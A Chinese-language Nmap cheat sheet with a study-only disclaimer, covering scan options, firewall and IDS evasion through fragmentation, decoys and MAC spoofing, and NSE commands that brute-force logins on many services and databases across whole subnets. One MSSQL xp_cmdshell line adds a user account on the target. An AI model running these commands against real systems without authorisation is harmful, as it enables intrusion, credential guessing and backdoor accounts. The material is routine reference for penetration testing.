# Nmap

<p align="center">
    <img src="../../../assets/img/logo/nmap.png" width="20%"></a>
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**官网**
- https://nmap.org/

**文章 & Reference**
- [[渗透神器系列]nmap](https://thief.one/2017/05/02/1/)
- [Nmap扫描原理与用法](https://blog.csdn.net/aspirationflow/article/details/7694274)
- [Nmap 进阶使用 [ 脚本篇 ]](https://www.freebuf.com/column/149716.html)

**zenmap**
- [Zenmap - 跨平台的 GUI 版 nmap bug 较多,不宜使用](https://nmap.org/zenmap/)

**脚本**
- [smb-enum-users](https://nmap.org/nsedoc/scripts/smb-enum-users.html)

**报告模板**
- [honze-net/nmap-bootstrap-xsl](https://github.com/honze-net/nmap-bootstrap-xsl)

**导图**
- Nmap 渗透测试思维导图 [png](../../../assets/img/安全/工具/nmap/Nmap渗透测试思维导图.png)

---

# 用法

常用: `nmap -T5 -A -v -p- <target ip>`

TCP1:`nmap -Pn -sS --stats-every 3m --max-scan-delay 20 -T4 -p1-65535 ip -oN <target ip>`

TCP2:`nmap -nvv -Pn -sSV -p <port> --version-intensity 9 -A ip -oN <target ip>`

UDP:`nmap -Pn --top-ports 1000 -sU --stats-every 3m -T3 ip -oN <target ip>`

## 常用参数

```
-F             端口扫描
-sT            tcp 端口扫描
-sU            udp 扫描
-A             综合扫描
-O             系统扫描
-p             指定端口扫描
-T             优化时间 1-5 强度
-sV            端口对应的服务探测
-sP            发现扫描网络存活主机
-sS            半隐藏式隐蔽扫描
--iL           从主机/网络列表输入
--tr           路由跟踪模式
-P0            (无 ping)
-sP            (Ping 扫描)

--script=vuln  利用脚本漏洞探测
--script=>>>>>>>   调用一个脚本
-oG  nmap.txt  将结果保存到 nmap.txt
```

**返回值**
```
|返回状态            |说明
| ----------------- |-----
|open               |端口开启,数据有到达主机,有程序在端口上监控
|close              |端口关闭,数据有到达主机,没有程序在端口上监控
|filtered           |未到达主机,返回的结果为空,被防火墙或IDS过滤
|unfiltered         |到达主机,但是不能识别端口当前状态
|open\|filtered     |端口没有返回值,主要发生在UDP,IP,FIN,NULL和Xmas扫描
|closed\|filtered   |只发生在IP,ID,idle扫描
```

---

## 基本操作

nmap 默认发送一个 ARP 的 PING 数据包,来探测目标主机 1-10000 范围内所开放的所有端口

`nmap <target ip>`

**详细的描述输出**

`namp -vv <target ip>`

**自定义扫描**

`nmap -p (range) <target IP>`

**指定端口扫描**

`nmap -p (port1,port2,…) <target IP>`

**ping 扫描**

`nmap -sP <target ip>`

**路由跟踪**

`nmap –traceroute <target IP>`

**扫描一个段**

`nmap -sP <network address> </CIDR>`

**探测操作系统类型**

`nmap -0 <target IP>`

**进攻性扫描**

`nmap -A <target ip>`

**混合式扫描**

`nmap -vv -p1-100 -O <target ip>`

**用一组 IP 地址掩盖真实地址**
`namp -D <IP地址1,IP地址2... IP地址,ME> <target ip>`

**伪装 MAC 地址**

`nmap --spoof-mac <伪造 MAC IP地址> <target ip>`

**指定网卡进行扫描**

`nmap -e <iface> <target ip>`

**指定源端口**

`nmap -g/--source-port <portnum> <target ip>`

**扫描速度**

`nmap -T<1-5> <target ip>`

---

## 脚本
### 规避

参考 : https://nmap.org/book/man-bypass-firewalls-ids.html

- 分割数据包
    - 利用 IP 分片进行端口扫描 : `nmap -f 192.168.100.1`
        - 设置分片大小 : `nmap -f --mtu 8 192.168.100.1`
    - 跨网段的扫描存活主机和 TOP1000 端口 : `nmap -v -Pn -n -e eth0 --min-hostgroup 1024 --min-parallelism 1024 -f 192.168.100.1/24 -oN /root/1.txt`

- 欺骗 ip 和 mac 地址,不能跨网段
    - `nmap -v -Pn -n -S 192.168.100.101 -e eth0 --spoof-mac 0 --min-hostgroup 1024 --min-parallelism 1024 -f 192.168.100.1/24 -oN /root/1.txt`

---

### 常见

- smb
    - 枚举 SMB 用户 : `nmap --script smb-enum-users.nse -p 445 <target ip>`
    - 枚举 SMB 用户 : `nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <target ip>`

- http
    - 用于知道自己网站使用了哪些 http 方法 : `nmap -p 80 --script http-methods <www.xxx.com>`
    - 寻找登录授权页面 : `nmap -p 80 --script http-auth-finder <www.xxx.com>`
    - 启用所有和授权有关的脚本对目标主机进行探测 : `nmap -p-80 --script=auth <www.xxx.com>`

- rsync
    - 爆破 : `nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' <target ip>/24`

- vnc
    - 信息探测 : `nmap -p 5901 -script vnc-info <target ip>`
    - 爆破 : `nmap --script vnc-brute -p 5900 <target ip>/24`

- SSH
    - 爆破 : `nmap -p22 --script ssh-brute <target ip>`

- telnet
    - 爆破 : `nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v <target ip>/24`

- ldap
    - 爆破 : `nmap -p 389 --script ldap-brute --script-args ldap.base='cn=users,dc=cqure,dc=net' <target ip>/24`

- FTP
    - 信息探测 : `nmap -p21 --script ftp-syst <target ip>`
    - 爆破 : `nmap -p21 <target ip> --script ftp-brute --script-args userdb=/root/user.txt,passdb=/root/pass.txt`

- SNMP
    - 查找 snmp 弱口令 : `nmap –sU –p161 –script=snmp-brute <target ip>`
    - 获取网络端口状态 : `nmap -sU -p161 --script=snmp-netstat <target ip>`
    - 获取系统信息 : `nmap –sU –p161 –script=snmp-sysdescr <target ip>`
    - 获取用户信息 : `nmap -sU -p161 --script=snmp-win32-user <target ip>`

- SMTP
    - 枚举用户名 : `nmap -p 25 --script smtp-enum-users.nse <target ip>`

- 截图
    - [Nmap-Tools/NSE/http-screenshot.nse](https://github.com/SpiderLabs/Nmap-Tools/blob/master/NSE/http-screenshot.nse)

- dns
    - 域传送 : `nmap -p 53 --script dns-zone-transfer.nse -v <target ip>`

---

### 数据库

- MySQL
    - 信息收集 : `nmap -p3306 --script mysql-enum <target ip>`
    - mysql 扫描 root 空密码 : `nmap -p 3306 --script mysql-empty-password.nse -v <target ip>`
    - mysql root 弱口令简单爆破 : `nmap -p 3306 --script mysql-brute.nse -v <target ip>`

- mssql
    - 扫描 sa 空密码 : `nmap -p 1433 --script ms-sql-empty-password.nse -v <target ip>/24`
    - sa 弱口令爆破 : `nmap -p 1433 --script ms-sql-brute.nse -v <target ip>/24`
    - 利用 xp_cmdshell,远程执行系统命令 : `nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add <target ip>/24`

- postgresql
    - 爆破 : `nmap -p 5432 --script pgsql-brute -v <target ip>/24`

- oracle
    - 爆破 : `nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL  -v <target ip>/24`
    - 爆破 : `nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v <target ip>/24`

- mongdb
    - 爆破 : `nmap -p 27017  --script mongodb-brute <target ip>/24`

- redis
    - 爆破 : `nmap -p 6379 --script redis-brute.nse <target ip>/24`
